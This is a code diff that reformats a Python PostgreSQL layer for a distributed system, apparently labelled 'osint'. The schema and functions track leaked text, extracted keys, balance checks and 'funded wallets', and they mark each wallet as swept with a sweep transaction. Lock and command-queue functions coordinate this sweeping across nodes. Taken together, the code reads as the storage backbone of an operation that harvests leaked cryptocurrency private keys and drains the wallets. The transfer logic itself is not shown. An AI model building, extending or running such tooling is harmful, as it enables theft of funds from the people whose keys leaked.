@@ -1,4 +1,5 @@
 """PostgreSQL database layer for master-node shared state."""
+
 from __future__ import annotations
 import hashlib
 import json
@@ -17,7 +18,10 @@ async def get_pool():
     global _pool
     if _pool is None:
         import asyncpg
-        dsn = os.getenv("DATABASE_URL", "postgresql://osint:osint@localhost:5432/osint_shared")
+
+        dsn = os.getenv(
+            "DATABASE_URL", "postgresql://osint:osint@localhost:5432/osint_shared"
+        )
         _pool = await asyncpg.create_pool(dsn, min_size=2, max_size=10)
     return _pool
 
@@ -130,6 +134,7 @@ async def init_db():
 
 # ── Key operations ──────────────────────────────────────────────────────────
 
+
 def hash_key(key_raw: str) -> str:
     """Hash a key for dedup."""
     return hashlib.sha256(key_raw.encode()).hexdigest()[:32]
@@ -139,7 +144,9 @@ async def is_key_seen(key_hash: str) -> bool:
     """Check if a key has already been seen."""
     pool = await get_pool()
     async with pool.acquire() as conn:
-        row = await conn.fetchrow("SELECT 1 FROM seen_keys WHERE key_hash = $1", key_hash)
+        row = await conn.fetchrow(
+            "SELECT 1 FROM seen_keys WHERE key_hash = $1", key_hash
+        )
         return row is not None
 
 
@@ -149,7 +156,10 @@ async def mark_key_seen(key_hash: str, key_type: str, source: str, node_id: str)
     async with pool.acquire() as conn:
         await conn.execute(
             "INSERT INTO seen_keys (key_hash, key_type, source, node_id) VALUES ($1, $2, $3, $4) ON CONFLICT DO NOTHING",
-            key_hash, key_type, source, node_id,
+            key_hash,
+            key_type,
+            source,
+            node_id,
         )
 
 
@@ -174,38 +184,55 @@ async def bulk_mark_seen(keys: list[dict[str, str]]):
 
 # ── Leak operations ─────────────────────────────────────────────────────────
 
+
 async def record_raw_leak(source: str, url: str, text_hash: str, node_id: str) -> int:
     """Record a raw leak. Returns the leak ID."""
     pool = await get_pool()
     async with pool.acquire() as conn:
         row = await conn.fetchrow(
             "INSERT INTO raw_leaks (source, url, text_hash, node_id) VALUES ($1, $2, $3, $4) RETURNING id",
-            source, url, text_hash, node_id,
+            source,
+            url,
+            text_hash,
+            node_id,
         )
         return row["id"]
 
 
-async def record_extracted_key(key_hash: str, key_type: str, addresses: dict, leak_id: int, node_id: str):
+async def record_extracted_key(
+    key_hash: str, key_type: str, addresses: dict, leak_id: int, node_id: str
+):
     """Record an extracted key."""
     pool = await get_pool()
     async with pool.acquire() as conn:
         await conn.execute(
             "INSERT INTO extracted_keys (key_hash, key_type, addresses, leak_id, node_id) VALUES ($1, $2, $3, $4, $5)",
-            key_hash, key_type, json.dumps(addresses), leak_id, node_id,
+            key_hash,
+            key_type,
+            json.dumps(addresses),
+            leak_id,
+            node_id,
         )
 
 
-async def record_balance_check(address: str, chain: str, balance: float, key_hash: str, node_id: str):
+async def record_balance_check(
+    address: str, chain: str, balance: float, key_hash: str, node_id: str
+):
     """Record a balance check."""
     pool = await get_pool()
     async with pool.acquire() as conn:
         await conn.execute(
             "INSERT INTO balance_checks (address, chain, balance, key_hash, node_id) VALUES ($1, $2, $3, $4, $5)",
-            address, chain, balance, key_hash, node_id,
+            address,
+            chain,
+            balance,
+            key_hash,
+            node_id,
         )
 
 
 # ── Funded wallet operations ────────────────────────────────────────────────
+
 
 async def record_funded_wallet(address: str, chain: str, balance: float, key_hash: str):
     """Record a funded wallet."""
@@ -213,7 +240,10 @@ async def record_funded_wallet(address: str, chain: str, balance: float, key_has
     async with pool.acquire() as conn:
         await conn.execute(
             "INSERT INTO funded_wallets (address, chain, balance, key_hash) VALUES ($1, $2, $3, $4) ON CONFLICT DO NOTHING",
-            address, chain, balance, key_hash,
+            address,
+            chain,
+            balance,
+            key_hash,
         )
 
 
@@ -221,7 +251,9 @@ async def get_unswept_wallets() -> list[dict]:
     """Get all funded wallets that haven't been swept."""
     pool = await get_pool()
     async with pool.acquire() as conn:
-        rows = await conn.fetch("SELECT * FROM funded_wallets WHERE swept = FALSE ORDER BY balance DESC")
+        rows = await conn.fetch(
+            "SELECT * FROM funded_wallets WHERE swept = FALSE ORDER BY balance DESC"
+        )
         return [dict(r) for r in rows]
 
 
@@ -231,13 +263,17 @@ async def mark_swept(address: str, sweep_tx: str):
     async with pool.acquire() as conn:
         await conn.execute(
             "UPDATE funded_wallets SET swept = TRUE, sweep_tx = $2 WHERE address = $1",
-            address, sweep_tx,
+            address,
+            sweep_tx,
         )
 
 
 # ── Sweep lock operations ───────────────────────────────────────────────────
 
-async def acquire_sweep_lock(address: str, node_id: str, ttl_seconds: int = 300) -> bool:
+
+async def acquire_sweep_lock(
+    address: str, node_id: str, ttl_seconds: int = 300
+) -> bool:
     """Try to acquire a sweep lock. Returns True if acquired."""
     pool = await get_pool()
     async with pool.acquire() as conn:
@@ -247,13 +283,18 @@ async def acquire_sweep_lock(address: str, node_id: str, ttl_seconds: int = 300)
         try:
             expires = datetime.now(timezone.utc).replace(second=0, microsecond=0)
             from datetime import timedelta
+
             expires = expires + timedelta(seconds=ttl_seconds)
             await conn.execute(
                 "INSERT INTO sweep_locks (address, node_id, expires_at) VALUES ($1, $2, $3) ON CONFLICT DO NOTHING",
-                address, node_id, expires,
+                address,
+                node_id,
+                expires,
             )
             # Check if we got the lock
-            row = await conn.fetchrow("SELECT node_id FROM sweep_locks WHERE address = $1", address)
+            row = await conn.fetchrow(
+                "SELECT node_id FROM sweep_locks WHERE address = $1", address
+            )
             return row is not None and row["node_id"] == node_id
         except Exception:
             return False
@@ -265,11 +306,13 @@ async def release_sweep_lock(address: str, node_id: str):
     async with pool.acquire() as conn:
         await conn.execute(
             "DELETE FROM sweep_locks WHERE address = $1 AND node_id = $2",
-            address, node_id,
+            address,
+            node_id,
         )
 
 
 # ── Node assignment operations ──────────────────────────────────────────────
+
 
 async def assign_sources(node_id: str, sources: list[str]):
     """Assign sources to a node."""
@@ -277,7 +320,8 @@ async def assign_sources(node_id: str, sources: list[str]):
     async with pool.acquire() as conn:
         await conn.execute(
             "INSERT INTO node_assignments (node_id, sources, updated_at) VALUES ($1, $2, NOW()) ON CONFLICT (node_id) DO UPDATE SET sources = $2, updated_at = NOW()",
-            node_id, sources,
+            node_id,
+            sources,
         )
 
 
@@ -285,11 +329,14 @@ async def get_assigned_sources(node_id: str) -> list[str]:
     """Get sources assigned to a node."""
     pool = await get_pool()
     async with pool.acquire() as conn:
-        row = await conn.fetchrow("SELECT sources FROM node_assignments WHERE node_id = $1", node_id)
+        row = await conn.fetchrow(
+            "SELECT sources FROM node_assignments WHERE node_id = $1", node_id
+        )
         return list(row["sources"]) if row else []
 
 
 # ── Heartbeat operations ────────────────────────────────────────────────────
+
 
 async def record_heartbeat(node_id: str, status: dict) -> str:
     """Record a node heartbeat. Returns the actual node_id used (may differ if duplicate)."""
@@ -335,11 +382,14 @@ async def get_all_heartbeats() -> list[dict]:
     """Get all node heartbeats."""
     pool = await get_pool()
     async with pool.acquire() as conn:
-        rows = await conn.fetch("SELECT * FROM node_heartbeats ORDER BY last_heartbeat DESC")
+        rows = await conn.fetch(
+            "SELECT * FROM node_heartbeats ORDER BY last_heartbeat DESC"
+        )
         return [dict(r) for r in rows]
 
 
 # ── Stats operations ────────────────────────────────────────────────────────
+
 
 async def get_stats() -> dict:
     """Get aggregate stats."""
@@ -348,8 +398,12 @@ async def get_stats() -> dict:
         seen_count = await conn.fetchval("SELECT COUNT(*) FROM seen_keys")
         leaks_count = await conn.fetchval("SELECT COUNT(*) FROM raw_leaks")
         keys_count = await conn.fetchval("SELECT COUNT(*) FROM extracted_keys")
-        funded_count = await conn.fetchval("SELECT COUNT(*) FROM funded_wallets WHERE swept = FALSE")
-        swept_count = await conn.fetchval("SELECT COUNT(*) FROM funded_wallets WHERE swept = TRUE")
+        funded_count = await conn.fetchval(
+            "SELECT COUNT(*) FROM funded_wallets WHERE swept = FALSE"
+        )
+        swept_count = await conn.fetchval(
+            "SELECT COUNT(*) FROM funded_wallets WHERE swept = TRUE"
+        )
         nodes_count = await conn.fetchval("SELECT COUNT(*) FROM node_heartbeats")
         return {
             "seen_keys": seen_count,
@@ -362,6 +416,7 @@ async def get_stats() -> dict:
 
 
 # ── Audit operations ────────────────────────────────────────────────────────
+
 
 async def get_audit_trail(limit: int = 100) -> list[dict]:
     """Get recent audit trail."""
@@ -381,13 +436,16 @@ async def get_audit_trail(limit: int = 100) -> list[dict]:
 
 # ── Command queue operations ────────────────────────────────────────────────
 
+
 async def enqueue_command(node_id: str, command: str, payload: dict | None = None):
     """Add a command to the queue for a node."""
     pool = await get_pool()
     async with pool.acquire() as conn:
         await conn.execute(
             "INSERT INTO command_queue (node_id, command, payload) VALUES ($1, $2, $3)",
-            node_id, command, json.dumps(payload or {}),
+            node_id,
+            command,
+            json.dumps(payload or {}),
         )
 
 
@@ -403,6 +461,7 @@ async def claim_commands(node_id: str, limit: int = 10) -> list[dict]:
                  ORDER BY created_at ASC LIMIT $2
                )
                RETURNING id, command, payload, created_at""",
-            node_id, limit,
+            node_id,
+            limit,
         )
         return [dict(r) for r in rows]
